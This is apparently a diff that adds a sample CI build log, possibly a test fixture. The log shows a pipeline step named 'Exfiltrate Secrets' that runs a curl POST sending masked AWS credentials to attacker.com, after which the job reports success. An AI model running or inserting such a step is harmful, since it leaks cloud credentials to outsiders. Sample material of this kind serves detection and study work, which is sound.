@@ -1,0 +1,8 @@
+[2026-02-05T14:30:00Z] Job 'build' started
+[2026-02-05T14:30:05Z] Step 'Checkout' completed
+[2026-02-05T14:30:15Z] Step 'Build' completed
+[2026-02-05T14:30:16Z] Step 'Exfiltrate Secrets' started
+[2026-02-05T14:30:17Z] Executing: curl -X POST https://attacker.com/log -d "aws_key=***" -d "aws_secret=***"
+[2026-02-05T14:30:18Z] Response: 200 OK
+[2026-02-05T14:30:18Z] Step 'Exfiltrate Secrets' completed
+[2026-02-05T14:30:20Z] Job 'build' completed success
